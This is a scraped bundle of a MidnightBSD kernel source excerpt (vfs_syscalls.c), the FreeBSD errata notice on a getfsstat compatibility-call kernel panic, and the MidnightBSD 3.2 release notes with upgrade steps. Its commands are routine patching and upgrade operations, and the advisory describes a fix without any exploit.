 error = copyin(uap->u\_fhp, &fh, sizeof(fhandle\_t)); if (error != 0) return (error); sfp = malloc(sizeof(struct statfs), M\_STATFS, M\_WAITOK); error = kern\_fhstatfs(td, fh, sfp); if (error == 0) { cvtstatfs(sfp, &osb); error = copyout(&osb, uap->buf, sizeof(osb)); } free(sfp, M\_STATFS); return (error);}
/\* \* Convert a new format statfs structure to an old format statfs structure. \*/static voidcvtstatfs(struct statfs \*nsp, struct ostatfs \*osp){
 statfs\_scale\_blocks(nsp, LONG\_MAX); bzero(osp, sizeof(\*osp)); osp->f\_bsize = nsp->f\_bsize; osp->f\_iosize = MIN(nsp->f\_iosize, LONG\_MAX); osp->f\_blocks = nsp->f\_blocks; osp->f\_bfree = nsp->f\_bfree; osp->f\_bavail = nsp->f\_bavail; osp->f\_files = MIN(nsp->f\_files, LONG\_MAX); osp->f\_ffree = MIN(nsp->f\_ffree, LONG\_MAX); osp->f\_owner = nsp->f\_owner; osp->f\_type = nsp->f\_type; osp->f\_flags = nsp->f\_flags; osp->f\_syncwrites = MIN(nsp->f\_syncwrites, LONG\_MAX); osp->f\_asyncwrites = MIN(nsp->f\_asyncwrites, LONG\_MAX); osp->f\_syncreads = MIN(nsp->f\_syncreads, LONG\_MAX); osp->f\_asyncreads = MIN(nsp->f\_asyncreads, LONG\_MAX); strlcpy(osp->f\_fstypename, nsp->f\_fstypename, MIN(MFSNAMELEN, OMFSNAMELEN)); strlcpy(osp->f\_mntonname, nsp->f\_mntonname, MIN(MNAMELEN, OMNAMELEN)); strlcpy(osp->f\_mntfromname, nsp->f\_mntfromname, MIN(MNAMELEN, OMNAMELEN)); osp->f\_fsid = nsp->f\_fsid;}#endif /\* COMPAT\_FREEBSD4 \*/
/\* \* Change current working directory to a given file descriptor. \*/#ifndef \_SYS\_SYSPROTO\_H\_struct fchdir\_args { int fd;};#endifintsys\_fchdir(struct thread \*td, struct fchdir\_args \*uap){ struct vnode \*vp, \*tdp; struct mount \*mp; struct file \*fp; cap\_rights\_t rights; int error;
 AUDIT\_ARG\_FD(uap->fd); error = getvnode(td, uap->fd, cap\_rights\_init(&rights, CAP\_FCHDIR), &fp); if (error != 0) return (error); vp = fp->f\_vnode; vrefact(vp); fdrop(fp, td); vn\_lock(vp, LK\_SHARED | LK\_RETRY); AUDIT\_ARG\_VNODE1(vp); error = change\_dir(vp, td); while (!error && (mp = vp->v\_mountedhere) != NULL) { if (vfs\_busy(mp, 0)) continue; error = VFS\_ROOT(mp, LK\_SHARED, &tdp); vfs\_unbusy(mp); if (error != 0) break; vput(vp); vp = tdp; } if (error != 0) { vput(vp); return (error); } VOP\_UNLOCK(vp, 0); pwd\_chdir(td, vp); return (0);}
/\* \* Change current working directory (``.''). \*/#ifndef \_SYS\_SYSPROTO\_H\_struct chdir\_args { char \*path;};#endifintsys\_chdir(struct thread \*td, struct chdir\_args \*uap){
 return (kern\_chdir(td, uap->path, UIO\_USERSPACE));}
intkern\_chdir(struct thread \*td, char \*path, enum uio\_seg pathseg){ struct nameidata nd; int error;
 NDINIT(&nd, LOOKUP, FOLLOW | LOCKSHARED | LOCKLEAF | AUDITVNODE1, pathseg, path, td); if ((error = namei(&nd)) != 0) return (error); if ((error = change\_dir(nd.ni\_vp, td)) != 0) { vput(nd.ni\_vp); NDFREE(&nd, NDF\_ONLY\_PNBUF); return (error); } VOP\_UNLOCK(nd.ni\_vp, 0); NDFREE(&nd, NDF\_ONLY\_PNBUF); pwd\_chdir(td, nd.ni\_vp); return (0);}
/\* \* Change notion of root (``/'') directory. \*/#ifndef \_SYS\_SYSPROTO\_H\_struct chroot\_args { char \*path;};#endifintsys\_chroot(struct thread \*td, struct chroot\_args \*uap){ struct nameidata nd; int error;
 error = priv\_check(td, PRIV\_VFS\_CHROOT); if (error != 0) return (error); NDINIT(&nd, LOOKUP, FOLLOW | LOCKSHARED | LOCKLEAF | AUDITVNODE1, UIO\_USERSPACE, uap->path, td); error = namei(&nd); if (error != 0) goto error; error = change\_dir(nd.ni\_vp, td); if (error != 0) goto e\_vunlock;#ifdef MAC error = mac\_vnode\_check\_chroot(td->td\_ucred, nd.ni\_vp); if (error != 0) goto e\_vunlock;#endif VOP\_UNLOCK(nd.ni\_vp, 0); error = pwd\_chroot(td, nd.ni\_vp); vrele(nd.ni\_vp); NDFREE(&nd, NDF\_ONLY\_PNBUF); return (error);e\_vunlock: vput(nd.ni\_vp);error: NDFREE(&nd, NDF\_ONLY\_PNBUF); return (error);}
/\* \* Common routine for chroot and chdir. Callers must provide a locked vnode \* instance. \*/intchange\_dir(struct vnode \*vp, struct thread \*td){#ifdef MAC int error;#endif
 ASSERT\_VOP\_LOCKED(vp, "change\_dir(): vp not locked"); if (vp->v\_type != VDIR) return (ENOTDIR);#ifdef MAC error = mac\_vnode\_check\_chdir(td->td\_ucred, vp); if (error != 0) return (error);#endif return (VOP\_ACCESS(vp, VEXEC, td->td\_ucred, td));}
static \_\_inline voidflags\_to\_rights(int flags, cap\_rights\_t \*rightsp){
 if (flags & O\_EXEC) { cap\_rights\_set(rightsp, CAP\_FEXECVE); } else { switch ((flags & O\_ACCMODE)) { case O\_RDONLY: cap\_rights\_set(rightsp, CAP\_READ); break; case O\_RDWR: cap\_rights\_set(rightsp, CAP\_READ); /\* FALLTHROUGH \*/ case O\_WRONLY: cap\_rights\_set(rightsp, CAP\_WRITE); if (!(flags & (O\_APPEND | O\_TRUNC))) cap\_rights\_set(rightsp, CAP\_SEEK); break; } }
 if (flags & O\_CREAT) cap\_rights\_set(rightsp, CAP\_CREATE);
 if (flags & O\_TRUNC) cap\_rights\_set(rightsp, CAP\_FTRUNCATE);
 if (flags & (O\_SYNC | O\_FSYNC)) cap\_rights\_set(rightsp, CAP\_FSYNC);
 if (flags & (O\_EXLOCK | O\_SHLOCK)) cap\_rights\_set(rightsp, CAP\_FLOCK);}
/\* \* Check permissions, allocate an open file structure, and call the device \* open routine if any. \*/#ifndef \_SYS\_SYSPROTO\_H\_struct open\_args { char \*path; int flags; int mode;};#endifintsys\_open(struct thread \*td, struct open\_args \*uap){
 return (kern\_openat(td, AT\_FDCWD, uap->path, UIO\_USERSPACE, uap->flags, uap->mode));}
#ifndef \_SYS\_SYSPROTO\_H\_struct openat\_args { int fd; char \*path; int flag; int mode;};#endifintsys\_openat(struct thread \*td, struct openat\_args \*uap){
 AUDIT\_ARG\_FD(uap->fd); return (kern\_openat(td, uap->fd, uap->path, UIO\_USERSPACE, uap->flag, uap->mode));}
intkern\_openat(struct thread \*td, int fd, char \*path, enum uio\_seg pathseg, int flags, int mode){ struct proc \*p = td->td\_proc; struct filedesc \*fdp = p->p\_fd; struct file \*fp; struct vnode \*vp; struct nameidata nd; cap\_rights\_t rights; int cmode, error, indx;
 indx = -1;
 AUDIT\_ARG\_FFLAGS(flags); AUDIT\_ARG\_MODE(mode); cap\_rights\_init(&rights, CAP\_LOOKUP); flags\_to\_rights(flags, &rights); /\* \* Only one of the O\_EXEC, O\_RDONLY, O\_WRONLY and O\_RDWR flags \* may be specified. \*/ if (flags & O\_EXEC) { if (flags & O\_ACCMODE) return (EINVAL); } else if ((flags & O\_ACCMODE) == O\_ACCMODE) { return (EINVAL); } else { flags = FFLAGS(flags); }
 /\* \* Allocate a file structure. The descriptor to reference it \* is allocated and set by finstall() below. \*/ error = falloc\_noinstall(td, &fp); if (error != 0) return (error); /\* \* An extra reference on `fp' has been held for us by \* falloc\_noinstall(). \*/ /\* Set the flags early so the finit in devfs can pick them up. \*/ fp->f\_flag = flags & FMASK; cmode = ((mode & ~fdp->fd\_cmask) & ALLPERMS) & ~S\_ISTXT; NDINIT\_ATRIGHTS(&nd, LOOKUP, FOLLOW | AUDITVNODE1, pathseg, path, fd, &rights, td); td->td\_dupfd = -1; /\* XXX check for fdopen \*/ error = vn\_open(&nd, &flags, cmode, fp); if (error != 0) { /\* \* If the vn\_open replaced the method vector, something \* wonderous happened deep below and we just pass it up \* pretending we know what we do. \*/ if (error == ENXIO && fp->f\_ops != &badfileops) goto success;
 /\* \* Handle special fdopen() case. bleh. \* \* Don't do this for relative (capability) lookups; we don't \* understand exactly what would happen, and we don't think \* that it ever should. \*/ if ((nd.ni\_lcf & NI\_LCF\_STRICTRELATIVE) == 0 && (error == ENODEV || error == ENXIO) && td->td\_dupfd >= 0) { error = dupfdopen(td, fdp, td->td\_dupfd, flags, error, &indx); if (error == 0) goto success; }
 goto bad; } td->td\_dupfd = 0; NDFREE(&nd, NDF\_ONLY\_PNBUF); vp = nd.ni\_vp;
 /\* \* Store the vnode, for any f\_type. Typically, the vnode use \* count is decremented by direct call to vn\_closefile() for \* files that switched type in the cdevsw fdopen() method. \*/ fp->f\_vnode = vp; /\* \* If the file wasn't claimed by devfs bind it to the normal \* vnode operations here. \*/ if (fp->f\_ops == &badfileops) { KASSERT(vp->v\_type != VFIFO, ("Unexpected fifo.")); fp->f\_seqcount = 1; finit(fp, (flags & FMASK) | (fp->f\_flag & FHASLOCK), DTYPE\_VNODE, vp, &vnops); }
 VOP\_UNLOCK(vp, 0); if (flags & O\_TRUNC) {[View remainder of file in raw view](https://github.com/MidnightBSD/src/raw/1691c07ff4f27b97220a5d65e217341e477f4014/sys/kern/vfs_syscalls.c)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.freebsd.org_d47a5715_20250119_120806.html ===
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
=============================================================================
FreeBSD-EN-20:18.getfsstat Errata Notice
The FreeBSD Project
Topic: getfsstat compatibility system call panic
Category: core
Module: getfsstat
Announced: 2020-09-02
Credits: Rodrigo Rubira Branco (BSDaemon), Amazon Web Services
Henrique L. Amorim, Independent Security Researcher
Affects: FreeBSD 11.3 and 11.4
Corrected: 2020-06-20 04:39:52 UTC (stable/11, 11.4-STABLE)
2020-09-02 16:22:14 UTC (releng/11.4, 11.4-RELEASE-p3)
2020-09-02 16:22:14 UTC (releng/11.3, 11.3-RELEASE-p13)
For general information regarding FreeBSD Errata Notices and Security
Advisories, including descriptions of the fields above, security
branches, and the following sections, please visit
.
I. Background
getfsstat(2) is a system call which provides information about mounted
filesystems. The kernel provides compatibility system calls for old
versions of the interface.
II. Problem Description
A bug in an internal interface used by getfsstat(2) compatibility system
calls could result in a free of an uninitialized pointer when getfsstat(2)
is called with an invalid argument.
III. Impact
A kernel panic can be triggered by an unprivileged user process.
IV. Workaround
No workaround is available.
V. Solution
Upgrade your system to a supported FreeBSD stable or release / security
branch (releng) dated after the correction date, and reboot.
Perform one of the following:
1) To update your system via a binary patch:
Systems running a RELEASE version of FreeBSD on the i386 or amd64
platforms can be updated via the freebsd-update(8) utility:
# freebsd-update fetch
# freebsd-update install
# shutdown -r +10min "Rebooting for an errata update"
2) To update your system via a source code patch:
The following patches have been verified to apply to the applicable
FreeBSD release branches.
a) Download the relevant patch from the location below, and verify the
detached PGP signature using your PGP utility.
# fetch https://security.FreeBSD.org/patches/EN-20:18/getfsstat.patch
# fetch https://security.FreeBSD.org/patches/EN-20:18/getfsstat.patch.asc
# gpg --verify getfsstat.patch.asc
b) Apply the patch. Execute the following commands as root:
# cd /usr/src
# patch < /path/to/patch
c) Recompile your kernel as described in
 and reboot the
system.
VI. Correction details
The following list contains the correction revision numbers for each
affected branch.
Branch/path Revision
- -------------------------------------------------------------------------
stable/11/ r362426
releng/11.4/ r365254
releng/11.3/ r365254
- -------------------------------------------------------------------------
To see which files were modified by a particular revision, run the
following command, replacing NNNNNN with the revision number, on a
machine with Subversion installed:
# svn diff -cNNNNNN --summarize svn://svn.freebsd.org/base
Or visit the following URL, replacing NNNNNN with the revision number:
VII. References
The latest revision of this advisory is available at
-----BEGIN PGP SIGNATURE-----
iQKTBAEBCgB9FiEE/A6HiuWv54gCjWNV05eS9J6n5cIFAl9RQrhfFIAAAAAALgAo
aXNzdWVyLWZwckBub3RhdGlvbnMub3BlbnBncC5maWZ0aGhvcnNlbWFuLm5ldEZD
MEU4NzhBRTVBRkU3ODgwMjhENjM1NUQzOTc5MkY0OUVBN0U1QzIACgkQ05eS9J6n
5cKOPRAAqrEteXljHWfgMTSEYBzWkGD7cgZXICmoUzhYpownamVU2yhm3g547v23
+kwfGMZs/AAlkBRBMiNAVflEFJ9qCHfZjx/+1AVHzMRchIca5R0xukaO5MDBSgvS
0LmqZM/vdd/15pWp3ptMfX6eeUUyfjxxoe7XWTrfEBdgzo7EHTlHpMKdZ/jjx4Ju
M3t0rgC5KNMNs7N8CiKpDUU/S79eXBQZ/w8GK3q4HO4Y2WEw3ogbNl8RxrplTVFo
UWQTii14wmjPOLVjyRro2enggfqEQ6LdQCOxwI6IetQxELUbIOUEeUg4AUdBciqe
t3R6iSZTKkmqODTUmIYixZxJJztDNBESC44G1/qUOuinqE27CEqFCvgA9pS4sRtP
PxSrfTN/J0EPbcGL6uJ337I+m2cWsuyTToRDwTL3C87pguQpTk2OpQMNaXqUtKN7
FUmv7dJ30ybzHEBm3yEUEXSMYSH3YSmweic3ZfoWsAAH7OgbCKrE+DOidds2t7yM
ffjWyagXVEzLTydLABGBmYPUtFQbV5jKZTZxdyvRc3NtiyD3vGHO3Y8ZzUtUl5PC
HaHVHC1mUAJfeA3hlu29Ohf8p0Ukv/82ybMh9H2WlTC+VZklvUuUdDpRArgEpnzd
75kSLTF4k2egWpgrocoUqcaMbSLEB5uiVwMM0/5tm9ly3enk1Yc=
=r/H7
-----END PGP SIGNATURE-----


=== Content from www.midnightbsd.org_dbe1e50f_20250119_120806.html ===

# [MidnightBSD: The BSD For Everyone](../ "MidnightBSD Home")

* [Home](/)
  + [News](/news/)
  + [Security](/security/)

* [About](/about/)
  + [History](/about/#history)
* [Download](/download/)
  + [Release Notes](/notes/)
  + [Mirror Status](/mirmon/)
  + [App Store](http://app.midnightbsd.org/)

* [Screenshots](/screenshots/)
  + [Screencasts](/screenshots/#screencasts)

* [Community](/community/)
  + [Mailing Lists](/mailman/listinfo/)
  + [Discussions](https://github.com/orgs/MidnightBSD/discussions "GitHub Discussions")
  + [Facebook](https://www.facebook.com/midnightbsd/)
  + [Art Project](/art/)
  + [Donations](/donate/)
  + [Merchandise](https://www.cafepress.com/midnightbsd/17167405)
  + [T-shirts](https://www.teepublic.com/t-shirt/56701250-midnightbsd-os-logo)

* [Developers](/developer/)
  + [OS Bugs](https://github.com/MidnightBSD/src/issues)
  + [mports Bugs](https://github.com/MidnightBSD/mports/issues)
  + [openGrok](http://www.midnightbsd.org/opengrok/)
  + [Magus](/magus/)
  + [Open HUB](https://www.openhub.net/p/mnbsd)

* [Support](/support/)
  + [OS Bugs](https://github.com/MidnightBSD/src/issues)
  + [mports Bugs](https://github.com/MidnightBSD/mports/issues)
  + [Documentation](/documentation/)
  + [Wiki](https://github.com/MidnightBSD/src/wiki)
  + [Manuals](http://man.midnightbsd.org/)
  + [App Store](https://app.midnightbsd.org/)
  + [Mports List](/mports/)
  + [Security Adv DB](https://sec.midnightbsd.org/)

## Release Notes icon MidnightBSD Release Notes

#### Late breaking information:

#### Previous Release Notes

* [0.1-RELEASE](0.1/index.html)
* [0.1.1-RELEASE](0.1.1/index.html)
* [0.2.1-RELEASE](0.2/index.html)
* [0.3-RELEASE](0.3/index.html)
* [0.4-RELEASE](0.4/index.html)
* [0.5-RELEASE](0.5/index.html)
* [0.6-RELEASE](0.6/index.html)
* [0.7-RELEASE](0.7/index.html)
* [0.8-RELEASE](0.8/index.html)
* [1.0-RELEASE](1.0/index.html)
* [1.1-RELEASE](1.1/index.html)
* [1.2-RELEASE](1.2/index.html)
* [2.0-RELEASE](2.0/index.html)
* [2.1-RELEASE](2.1/index.html)
* [2.2-RELEASE](2.2/index.html)
* [3.0-RELEASE](3.0/index.html)
* [3.1-RELEASE](3.1/index.html)
### (07/22/2024) MidnightBSD 3.2

Iâm happy to announce the availability of MidnightBSD 3.2 for amd64 and i386.

This release included updates to third-party libraries, bug fixes from the 3.1 release,
and security updates.
#### Upgrade Process

Install git if you donât have it already

`mport install git`

Fetch MidnightBSD from git via github.com/midnightbsd/src.git (assumes you donât have /usr/src populated)

`git clone -b stable/3.2 https://github.com/MidnightBSD/src.git`

NOTE: some users have experienced build errors on 2.x which require disabling perl in usr.bin/Makefile at the top and
removing camcontrol and df from the rescue/rescue/Makefile temporarily. You can build these once on 3.x.

`cd /usr/src; make -j4 clean buildworld buildkernel;

choose one of etcupdate or mergemaster -p

make installkernel

reboot`

(if it works OK, login and go to /usr/src)

`make installworld

choose one of etcupdate or mergemaster -iU`

Update installed mports/packages

For mport package manager, run
`mport index

mport clean

mport upgrade`

Remove old libraries and programs from the base.

`rm -rf /usr/lib/perl/5.36.1
cd /usr/src/; make check-old; make delete-old; make installworld;`

Perl was removed from base in 3.2. Install from mports or packages via mport install perl5.36

#### Bug Fixes and new features

##### Ravenports

Ravenports is available in MidnightBSD for the amd64 architecture. The initial installation process will
prompt you to bootstrap Ravenports. This will initialize it in /raven/, and you will be able to install
software packages using /raven/sbin/ravensw. By default, /raven/bin, /raven/sbin, and so on are not on the
path. You can add them to the path to make running software in your shell easier. Please visit their
website to learn more about Ravenports and find quickstart guides. <http://www.ravenports.com/>

You can choose either mports or Ravenports at installation time or use packages from both systems.
Please note that mixing packages may have some complications, although they are installed in a completely different place from mports.

There are various benefits to Ravenports, but a few are more updated packages and quite a few unique packages
that mports doesnât provide currently. For example, Ravenports has an updated Firefox package available.

You will not see Ravenports presented as an option on an i386 install.
##### Mport package manager

Updated mport to 2.6.2

##### Miscellaneous Changes

Fixed a bug with portsnap configuration with 3.x releases where it used an old index.

Fix for some vnc clients with bhyve, added com ports to bhyve

Various manual pages cleaned up.

zstd enabled in libarchive

telnetd removed

libfetch: don't rely on ca\_root\_nss for certificate validation

add endian.h for linux compatibility

#### Security Fixes

OpenSSH security vulnerability

OpenSSH 9.3p2 - CVE-2023-38408
Patch for CVE-2023-48795

Fix security issue in libpcap OSV-2020-1231

Fix for wpa supplicant CVE-2023-52160

pf security issue:

#### 3rd Party Software

* Perl removed from base. Install via mports* brainfuck removed from base. Moved to mports
  * Removed subversion from base. install from mports if needed. (use git for MidnightBSD)
  * expat 2.6.2
  * ldns 1.8.3
  * sendmail 8.18.1
  * libarchive 3.7.2
  * zstd 1.5.2
  * Unbound 1.19.3
  * xz / lzma 5.4.5
  * tzdata 2023d
  * mandoc 1.14.6
  * OpenSSH 9.3p2
  * nvi 2.2.1
  * openssl 1.1.1w

#### Hardware

PCI vendors list updated (April 2024)

AMD zen4 temperature sensor support

unbreak Promise RAID1 with 4+ providers

usbdevs: add quirk for WD MyPassport Ultra External HDD

ahci: add AMD KERNCZ (RAID) device id in RAID mode

#### Known Issues

Ravenports install is not in the path, but we also donât tell you that during bootstrap.

On VirtualBox 7, Xorg needs over 1GB of RAM allocated to run without swapping or crashing. Occasional VM hangs have also been seen. It works fine on bare metal, bhyve, or VMware products.

> ---

> [Legal Notices](/legal/) • [Sitemap](/sitemap/) • MidnightBSD
> © 2006-2025 Lucas Holt
>
> Choose Language: [English](/), [EspaÃ±ol](/lang/es/) or [FranÃ§ais](/lang/fr/)


